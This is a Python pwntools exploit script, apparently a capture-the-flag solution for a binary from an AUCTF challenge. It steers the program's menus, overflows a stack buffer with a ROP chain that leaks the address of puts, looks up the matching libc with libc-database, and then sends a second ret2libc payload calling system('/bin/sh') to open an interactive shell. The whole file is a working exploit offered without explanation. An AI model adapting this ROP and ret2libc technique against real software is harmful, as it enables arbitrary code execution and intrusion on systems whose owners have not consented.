#!/usr/bin/env python3

from pwn import *

p = process('./challenge')
#p = remote('challenges.auctf.com', 30012)

p.recvuntil('choice: ')
p.sendline('2')
p.recvuntil('enter: ')
p.sendline('4')
p.recvuntil('choice: ')
p.sendline('3')
p.recvuntil('exit: ')
p.sendline('Stephen')
p.recvuntil('something: ')

baseproc = 0x56555000
binary = ELF('challenge')

payload  = 20 * b'A' 
payload += p32(baseproc + binary.symbols['_GLOBAL_OFFSET_TABLE_'])
payload += p32(0xba5e0f10)
payload += p32(baseproc + binary.plt['puts'])
payload += p32(baseproc + binary.symbols['room4'])
payload += p32(baseproc + binary.got['puts'])

p.sendline(payload)
_ = p.recvuntil('something: ')

puts = u32(_[:4])
print("puts:" + str(hex(puts)))

import os
stream = os.popen("libc-database/find puts " + str(hex(puts & 0xFFF)) + " | grep archive-glibc | sed 's/)//' | awk '{print $NF}'")
output = stream.read().strip()
stream.close()

libc = ELF('libc-database/db/' + output + '.so')
baselibc = puts - libc.symbols['puts']
print("libc:" + str(hex(baselibc)))

payload  = 28 * b'A' 
payload += p32(baselibc + libc.symbols['system'])
payload += p32(baseproc + binary.symbols['room4'])
payload += p32(baselibc + next(libc.search(b"/bin/sh")))

p.sendline(payload)
p.interactive()
